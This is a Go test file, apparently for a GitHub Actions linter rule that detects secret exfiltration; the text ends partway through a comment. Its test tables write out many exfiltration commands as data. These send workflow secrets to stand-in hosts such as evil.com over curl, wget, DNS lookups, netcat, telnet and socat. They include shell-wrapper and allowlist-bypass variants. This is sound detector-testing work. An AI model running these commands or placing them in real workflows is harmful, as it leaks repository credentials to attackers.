package core

import (
	"strings"
	"testing"

	"github.com/sisaku-security/sisakulint/pkg/ast"
	"github.com/sisaku-security/sisakulint/pkg/shell"
	"gopkg.in/yaml.v3"
)

func TestNewSecretExfiltrationRule(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	if rule.RuleName != "secret-exfiltration" {
		t.Errorf("RuleName = %q, want %q", rule.RuleName, "secret-exfiltration")
	}
	if !strings.Contains(rule.RuleDesc, "exfiltrated") {
		t.Errorf("RuleDesc should contain 'exfiltrated', got %q", rule.RuleDesc)
	}
}

func runSecretExfiltrationRuleForTest(script string, envVars map[string]*ast.EnvVar) []*LintingError {
	rule := NewSecretExfiltrationRule()
	step := &ast.Step{
		Env: &ast.Env{Vars: envVars},
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: script,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}
	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)
	return rule.Errors()
}

func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl with direct secret in -d flag",
			runScript:   `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret in data flag",
		},
		{
			name:        "curl with secret in --data flag",
			runScript:   `curl --data "key=${{ secrets.SECRET_KEY }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in --data flag",
		},
		{
			name:        "curl with secret in -H flag",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in header",
		},
		{
			name:        "curl with attached -H value containing secret",
			runScript:   `curl -H"Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in attached -H header value",
		},
		{
			name:        "curl with attached -d value containing secret",
			runScript:   `curl -d"token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in attached -d data value",
		},
		{
			name:        "curl POST to github api (legitimate)",
			runScript:   `curl -X POST https://api.github.com/repos/owner/repo/issues -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"`,
			wantErrors:  0,
			description: "Should NOT detect curl to GitHub API (legitimate)",
		},
		{
			name:        "curl to npm registry (legitimate)",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.NPM_TOKEN }}" https://registry.npmjs.org`,
			wantErrors:  0,
			description: "Should NOT detect curl to NPM registry (legitimate)",
		},
		{
			name: "curl OAuth2 token exchange with Google (legitimate)",
			runScript: `curl -s -X POST https://oauth2.googleapis.com/token \
  -d "client_id=${{ secrets.CWS_CLIENT_ID }}" \
  -d "client_secret=${{ secrets.CWS_CLIENT_SECRET }}" \
  -d "refresh_token=${{ secrets.CWS_REFRESH_TOKEN }}" \
  -d "grant_type=refresh_token"`,
			wantErrors:  0,
			description: "Should NOT detect curl to Google's OAuth2 token endpoint",
		},
		{
			name:        "curl with secret to attacker-controlled Google Cloud Storage bucket",
			runScript:   `curl -d "secret=${{ secrets.TOKEN }}" https://storage.googleapis.com/attacker-owned-bucket/object`,
			wantErrors:  1,
			description: "Should detect secret sent to an attacker-controlled resource on another Google API",
		},
		{
			name:        "curl without secret",
			runScript:   `curl -X GET https://api.example.com/status`,
			wantErrors:  0,
			description: "Should NOT detect curl without secrets",
		},
		{
			name: "curl with secret in multiline script - same line",
			runScript: `#!/bin/bash
curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret on same line",
		},
		{
			name: "curl with GITHUB_TOKEN to github api via line continuation (legitimate)",
			runScript: `RELEASE_DATA=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
  "https://api.github.com/repos/owner/repo/releases/tags/v1.0")`,
			wantErrors:  0,
			description: "Should NOT flag GITHUB_TOKEN used with GitHub API across line continuation",
		},
		{
			name:        "curl with secret as URL positional arg (legitimate webhook)",
			runScript:   `RESPONSE=$(curl -s -w "%{http_code}" -H "Content-Type: application/json" -X POST -d "$DISCORD_PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }})`,
			wantErrors:  0,
			description: "Should NOT flag secret used as URL positional argument (not as flag value)",
		},
		{
			name:        "curl with secret in header to attacker (malicious)",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in auth header to external site",
		},
		{
			name: "curl with secret directly to github api via variable indirection (legitimate)",
			runScript: `api_url="https://api.github.com/repos/owner/repo"
result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/releases/latest")`,
			wantErrors:  0,
			description: "Should NOT flag curl when URL variable resolves to api.github.com",
		},
		{
			name:        "curl with secret directly to github api via bare host (legitimate)",
			runScript:   `curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" api.github.com/repos/owner/repo/releases/latest`,
			wantErrors:  0,
			description: "Should NOT flag curl when bare host destination is api.github.com",
		},
		{
			name:        "curl with secret to github api via inline url flag (legitimate)",
			runScript:   `curl --url=https://api.github.com/repos/owner/repo/releases/latest -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}"`,
			wantErrors:  0,
			description: "Should NOT flag curl when inline --url destination is api.github.com",
		},
		{
			name:        "curl with secret to uploads.github.com (legitimate)",
			runScript:   `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
			wantErrors:  0,
			description: "Should NOT flag curl upload to uploads.github.com",
		},
		{
			name: "curl with multi-line JSON body and github api URL (legitimate)",
			runScript: `release_id=$(curl -s -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
  -H "Accept: application/vnd.github.v3+json" \
  -d '{
    "tag_name": "v1.0",
    "name": "Release v1.0"
  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
			wantErrors:  0,
			description: "Should NOT flag curl with multi-line JSON body posting to GitHub API",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_WgetWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "wget with --post-data and secret",
			runScript:   `wget --post-data "token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in post-data",
		},
		{
			name:        "wget with --header and secret",
			runScript:   `wget --header "Authorization: ${{ secrets.AUTH_TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in header",
		},
		{
			name:        "wget from github (legitimate)",
			runScript:   `wget https://github.com/owner/repo/releases/download/v1.0/file.tar.gz`,
			wantErrors:  0,
			description: "Should NOT detect wget from GitHub without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_DNSExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "dig with secret in query",
			runScript:   `dig ${{ secrets.API_KEY }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect dig used for DNS exfiltration",
		},
		{
			name:        "nslookup with secret",
			runScript:   `nslookup ${{ secrets.TOKEN }}.evil.com`,
			wantErrors:  1,
			description: "Should detect nslookup used for DNS exfiltration",
		},
		{
			name:        "host with secret",
			runScript:   `host ${{ secrets.SECRET }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect host used for DNS exfiltration",
		},
		{
			name:        "dig without secret",
			runScript:   `dig example.com`,
			wantErrors:  0,
			description: "Should NOT detect dig without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_NetcatExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "nc with secret",
			runScript:   `echo "${{ secrets.TOKEN }}" | nc attacker.com 443`,
			wantErrors:  1,
			description: "Should detect nc with piped secret",
		},
		{
			name:        "netcat with secret",
			runScript:   `echo "${{ secrets.API_KEY }}" | netcat evil.com 80`,
			wantErrors:  1,
			description: "Should detect netcat with piped secret",
		},
		{
			name:        "telnet with secret",
			runScript:   `echo "${{ secrets.PASSWORD }}" | telnet attacker.com 23`,
			wantErrors:  1,
			description: "Should detect telnet with piped secret",
		},
		{
			name:        "socat with secret",
			runScript:   `echo "${{ secrets.SECRET }}" | socat - TCP:evil.com:443`,
			wantErrors:  1,
			description: "Should detect socat with piped secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
	tests := []struct {
		name        string
		envVars     map[string]*ast.EnvVar
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name: "curl with secret in env var",
			envVars: map[string]*ast.EnvVar{
				"my_token": {
					Name: &ast.String{Value: "MY_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.API_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -X POST https://attacker.com -d "token=$MY_TOKEN"`,
			wantErrors:  1,
			description: "Should detect curl with secret passed via env var",
		},
		{
			name: "curl with secret in env var using ${} syntax",
			envVars: map[string]*ast.EnvVar{
				"secret_key": {
					Name: &ast.String{Value: "SECRET_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "${SECRET_KEY}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in ${} syntax",
		},
		{
			name: "env var without secret",
			envVars: map[string]*ast.EnvVar{
				"normal_var": {
					Name: &ast.String{Value: "NORMAL_VAR"},
					Value: &ast.String{
						Value: "some-value",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "$NORMAL_VAR" https://example.com`,
			wantErrors:  0,
			description: "Should NOT detect env var without secret",
		},
		{
			name: "curl webhook URL as destination (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"GOOGLE_CHAT_WEBHOOK": {
					Name: &ast.String{Value: "GOOGLE_CHAT_WEBHOOK"},
					Value: &ast.String{
						Value: "${{ secrets.GOOGLE_CHAT_WEBHOOK }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK")`,
			wantErrors:  0,
			description: "Should NOT detect webhook URL used as curl POST destination (not data payload)",
		},
		{
			name: "curl with secret as data payload to untrusted URL",
			envVars: map[string]*ast.EnvVar{
				"SLACK_TOKEN": {
					Name: &ast.String{Value: "SLACK_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.SLACK_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -X POST https://attacker.com -d "token=$SLACK_TOKEN"`,
			wantErrors:  1,
			description: "Should detect secret env var used in -d data payload",
		},
		{
			name: "curl with secret in Authorization header to untrusted URL",
			envVars: map[string]*ast.EnvVar{
				"API_KEY": {
					Name: &ast.String{Value: "API_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.API_KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Authorization: Bearer $API_KEY" https://attacker.com/collect`,
			wantErrors:  1,
			description: "Should detect secret env var used in -H header to untrusted destination",
		},
		{
			name: "curl with content-type header before webhook URL (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"WEBHOOK_URL": {
					Name: &ast.String{Value: "WEBHOOK_URL"},
					Value: &ast.String{
						Value: "${{ secrets.WEBHOOK_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" "$WEBHOOK_URL"`,
			wantErrors:  0,
			description: "Should NOT detect webhook URL after -H content-type header (header is metadata, not payload)",
		},
		{
			name: "curl with header and data payload flag (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"SECRET_TOKEN": {
					Name: &ast.String{Value: "SECRET_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.SECRET_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" -d "$SECRET_TOKEN" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect secret env var used after -d payload flag even with preceding -H",
		},
		{
			name: "curl with literal -d payload and webhook URL as destination (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"WEBHOOK_URL": {
					Name: &ast.String{Value: "WEBHOOK_URL"},
					Value: &ast.String{
						Value: "${{ secrets.WEBHOOK_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -H "Content-Type: application/json" -d '{"key":"value"}' "$WEBHOOK_URL"`,
			wantErrors:  0,
			description: "Should NOT flag webhook URL env var when -d carries only literal data",
		},
		{
			name: "curl --header with secret in value (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"API_TOKEN": {
					Name: &ast.String{Value: "API_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.API_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl --header "X-API-Key: $API_TOKEN" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect secret env var inside --header value",
		},
		{
			name: "wget --header with secret in value (exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"AUTH_KEY": {
					Name: &ast.String{Value: "AUTH_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.AUTH_KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `wget --header "Authorization: $AUTH_KEY" https://attacker.com/data`,
			wantErrors:  1,
			description: "Should detect secret env var inside wget --header value",
		},
		{
			name: "curl simple webhook URL without any flags (not exfiltration)",
			envVars: map[string]*ast.EnvVar{
				"NOTIFY_URL": {
					Name: &ast.String{Value: "NOTIFY_URL"},
					Value: &ast.String{
						Value: "${{ secrets.NOTIFY_URL }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl "$NOTIFY_URL"`,
			wantErrors:  0,
			description: "Should NOT detect simple curl with only webhook URL",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Env: &ast.Env{
					Vars: tt.envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_LegitimatePatterns(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "npm publish with token",
			runScript:   `npm publish --access public`,
			wantErrors:  0,
			description: "npm publish is legitimate",
		},
		{
			name:        "docker login",
			runScript:   `docker login -u ${{ github.actor }} -p ${{ secrets.GITHUB_TOKEN }} ghcr.io`,
			wantErrors:  0,
			description: "docker login is legitimate",
		},
		{
			name:        "docker push",
			runScript:   `docker push ghcr.io/owner/image:latest`,
			wantErrors:  0,
			description: "docker push is legitimate",
		},
		{
			name:        "twine upload",
			runScript:   `twine upload dist/*`,
			wantErrors:  0,
			description: "twine upload is legitimate",
		},
		{
			name:        "gem push",
			runScript:   `gem push *.gem`,
			wantErrors:  0,
			description: "gem push is legitimate",
		},
		{
			name:        "cargo publish",
			runScript:   `cargo publish`,
			wantErrors:  0,
			description: "cargo publish is legitimate",
		},
		{
			name:        "aws configure",
			runScript:   `aws configure set aws_access_key_id ${{ secrets.AWS_ACCESS_KEY }}`,
			wantErrors:  0,
			description: "aws configure is legitimate",
		},
		{
			name:        "gcloud auth",
			runScript:   `gcloud auth activate-service-account --key-file key.json`,
			wantErrors:  0,
			description: "gcloud auth is legitimate",
		},
		{
			name:        "terraform login",
			runScript:   `terraform login`,
			wantErrors:  0,
			description: "terraform login is legitimate",
		},
		{
			name:        "gh api call",
			runScript:   `gh api repos/owner/repo/issues`,
			wantErrors:  0,
			description: "gh cli is legitimate",
		},
		{
			name:        "git push",
			runScript:   `git push origin main`,
			wantErrors:  0,
			description: "git push is legitimate",
		},
		{
			name:        "codecov upload",
			runScript:   `codecov -t ${{ secrets.CODECOV_TOKEN }}`,
			wantErrors:  0,
			description: "codecov is legitimate",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_ErrorMessages(t *testing.T) {
	tests := []struct {
		name           string
		runScript      string
		expectedSubstr string
		description    string
	}{
		{
			name:           "critical severity message",
			runScript:      `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			expectedSubstr: "critical",
			description:    "Should have critical severity for curl POST with secret",
		},
		{
			name:           "env var leak message",
			runScript:      `curl -d "$MY_TOKEN" https://evil.com`,
			expectedSubstr: "environment variable",
			description:    "Should mention environment variable in error",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			var envVars map[string]*ast.EnvVar
			if strings.Contains(tt.runScript, "$MY_TOKEN") {
				envVars = map[string]*ast.EnvVar{
					"my_token": {
						Name: &ast.String{Value: "MY_TOKEN"},
						Value: &ast.String{
							Value: "${{ secrets.TOKEN }}",
							Pos:   &ast.Position{Line: 1, Col: 1},
						},
					},
				}
			}

			step := &ast.Step{
				Env: &ast.Env{
					Vars: envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			errors := rule.Errors()
			if len(errors) == 0 {
				t.Fatalf("%s: Expected at least one error", tt.description)
			}

			found := false
			for _, err := range errors {
				if strings.Contains(err.Description, tt.expectedSubstr) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("%s: Expected error message to contain %q, got %v",
					tt.description, tt.expectedSubstr, errors)
			}
		})
	}
}

func TestSecretExfiltration_MultipleSecrets(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://evil.com -d "token=${{ secrets.TOKEN1 }}" -H "Auth: ${{ secrets.TOKEN2 }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}

	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)

	gotErrors := len(rule.Errors())
	if gotErrors != 2 {
		t.Errorf("Expected 2 errors for multiple secrets, got %d. Errors: %v",
			gotErrors, rule.Errors())
	}
}

func TestSecretExfiltration_CommandInSubshell(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl in subshell",
			runScript:   `$(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
			wantErrors:  1,
			description: "Should detect curl in subshell",
		},
		{
			name:        "curl with backticks",
			runScript:   "`curl -d \"${{ secrets.TOKEN }}\" https://evil.com`",
			wantErrors:  1,
			description: "Should detect curl with backticks",
		},
		{
			name:        "curl after && operator",
			runScript:   `echo "test" && curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after && operator",
		},
		{
			name:        "curl after ; semicolon",
			runScript:   `echo "test"; curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after semicolon",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_CurlToKnownGoodDomains(t *testing.T) {
	goodDomains := []string{
		"https://api.github.com/repos/owner/repo/releases",
		"https://codecov.io/upload/v2",
		"https://api.slack.com/api/chat.postMessage",
		"https://hooks.slack.com/services/xxx/yyy",
		"https://discord.com/api/webhooks/xxx",
		"https://api.telegram.org/botXXX/sendMessage",
		"https://sentry.io/api/xxx/store/",
		"https://datadoghq.com/api/v1/events",
		"https://api.snyk.io/v1/monitor",
		"https://sonarcloud.io/api/project_analyses/search",
	}

	for _, domain := range goodDomains {
		t.Run(domain, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: `curl -X POST ` + domain + ` -H "Authorization: ${{ secrets.TOKEN }}"`,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != 0 {
				t.Errorf("Should NOT detect curl to known good domain %s, got %d errors: %v",
					domain, gotErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_AllowlistRequiresDestinationHostBoundary(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		{
			name:      "allowlisted host in header does not suppress malicious destination",
			runScript: `curl -H "Referer: https://api.github.com" -d "token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "allowlisted host suffix is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "untrusted second destination prevents allowlist suppression",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com https://evil.com`,
			wantErrs:  1,
		},
		{
			name:      "artifactory in untrusted path does not allowlist",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/artifactory`,
			wantErrs:  1,
		},
		{
			name:      "hashicorp in untrusted path does not allowlist",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/hashicorp`,
			wantErrs:  1,
		},
		{
			name:      "artifactory product host is not implicitly allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.example.com/api`,
			wantErrs:  1,
		},
		{
			name:      "artifactory attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "nexus in attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil-nexus.com`,
			wantErrs:  1,
		},
		{
			name:      "vault attacker-controlled host is not allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://vault.evil.com`,
			wantErrs:  1,
		},
		{
			name:      "explicit hashicorp domain remains allowlisted",
			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://releases.hashicorp.com/vault/`,
			wantErrs:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_CriticalRegressions covers the four bypass classes
// identified in the PR #464 review: path-prefix allowlist boundary,
// shell-wrapper re-parsing (bash -c / sh -c / eval), xargs/parallel wrappers,
// and the parse-failure fallback warning.
func TestSecretExfiltration_CriticalRegressions(t *testing.T) {
	tests := []struct {
		name      string
		runScript string
		wantErrs  int
	}{
		// C1 — path boundary: pattern "slack.com/api" must not allowlist "/api2/evil".
		{
			name:      "C1 path-prefix bypass: slack.com/api2/evil is not allowlisted",
			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api2/evil`,
			wantErrs:  1,
		},
		{
			name:      "C1 path boundary: dash-suffixed sibling path is not allowlisted",
			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api-attacker/foo`,
			wantErrs:  1,
		},
		{
			name:      "C1 exact path remains allowlisted",
			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api`,
			wantErrs:  0,
		},
		{
			name:      "C1 trailing slash on real path remains allowlisted",
			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api/v1/chat.postMessage`,
			wantErrs:  0,
		},

		// C2 — shell wrapper re-parsing.
		{
			name:      "C2 bash -c wrapping curl is detected",
			runScript: `bash -c 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
			wantErrs:  1,
		},
		{
			name:      "C2 sh -c wrapping curl is detected",
			runScript: `sh -c "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
			wantErrs:  1,
		},
		{
			name:      "C2 eval wrapping curl is detected",
			runScript: `eval "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
			wantErrs:  1,
		},
		{
			name:      "C2 bash -c with allowlisted destination is not flagged",
			runScript: `bash -c 'curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com/repos'`,
			wantErrs:  0,
		},

		// C3 — xargs / parallel wrappers.
		{
			name:      "C3 xargs invoking curl is detected",
			runScript: `echo https://evil.com | xargs curl -d "${{ secrets.TOKEN }}"`,
			wantErrs:  1,
		},
		{
			name:      "C3 xargs with -I joined replacement is detected",
			runScript: `echo evil.com | xargs -I{} curl -d "${{ secrets.TOKEN }}" https://{}`,
			wantErrs:  1,
		},
		{
			name:      "C3 xargs with -I separated replacement is detected",
			runScript: `echo evil.com | xargs -I {} curl -d "${{ secrets.TOKEN }}" https://{}`,
			wantErrs:  1,
		},
		{
			name:      "C3 parallel invoking curl is detected",
			runScript: `parallel curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
			wantErrs:  1,
		},
		{
			name:      "C3 parallel with -j flag is detected",
			runScript: `parallel -j 4 curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
			wantErrs:  1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
			if len(errors) != tt.wantErrs {
				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
			}
		})
	}
}

// TestSecretExfiltration_ParseFailureFallback ensures the rule emits a
// conservative warning rather than silently dropping detection when the shell
